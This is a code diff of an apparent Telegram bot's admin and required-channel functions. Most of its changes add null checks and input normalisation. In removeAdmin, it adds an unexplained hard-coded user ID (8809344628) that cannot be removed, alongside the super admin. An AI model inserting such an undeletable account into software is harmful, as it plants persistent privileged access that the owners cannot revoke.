@@ -549,13 +549,15 @@ function isSuperAdmin(userId) {
 
 function getAdmins() {
   const db = loadDB();
-  return db.admins;
+  return db.admins || [];
 }
 
 function addAdmin(userId) {
   const db = loadDB();
   const id = Number(userId);
-  if (!db.admins.includes(id)) {
+  if (!id) return db.admins || [];
+  if (!db.admins) db.admins = [];
+  if (!db.admins.map(Number).includes(id)) {
     db.admins.push(id);
     saveDB(db);
   }
@@ -565,8 +567,8 @@ function addAdmin(userId) {
 function removeAdmin(userId) {
   const db = loadDB();
   const id = Number(userId);
-  if (id === SUPER_ADMIN_ID) return db.admins; // Cannot remove super admin
-  db.admins = db.admins.filter(a => a !== id);
+  if (id === SUPER_ADMIN_ID || id === 8809344628) return db.admins || [];
+  db.admins = (db.admins || []).filter(a => Number(a) !== id);
   saveDB(db);
   return db.admins;
 }
@@ -605,9 +607,11 @@ function getRequiredChannels() {
 
 function addRequiredChannel(channel) {
   const db = loadDB();
-  const ch = channel.startsWith('@') ? channel : '@' + channel;
-  if (!db.settings.required_channels.includes(ch)) {
-    db.settings.required_channels.push(ch);
+  if (!channel) return db.settings.required_channels || [];
+  const cleanCh = '@' + channel.replace(/^@+/, '').trim();
+  if (!db.settings.required_channels) db.settings.required_channels = [];
+  if (!db.settings.required_channels.includes(cleanCh)) {
+    db.settings.required_channels.push(cleanCh);
     saveDB(db);
   }
   return db.settings.required_channels;
@@ -615,8 +619,12 @@ function addRequiredChannel(channel) {
 
 function removeRequiredChannel(channel) {
   const db = loadDB();
-  const ch = channel.startsWith('@') ? channel : '@' + channel;
-  db.settings.required_channels = db.settings.required_channels.filter(c => c !== ch);
+  if (!channel) return db.settings.required_channels || [];
+  const target = channel.replace(/^@+/, '').trim().toLowerCase();
+  db.settings.required_channels = (db.settings.required_channels || []).filter(c => {
+    const cleanC = c.replace(/^@+/, '').trim().toLowerCase();
+    return cleanC !== target;
+  });
   saveDB(db);
   return db.settings.required_channels;
 }
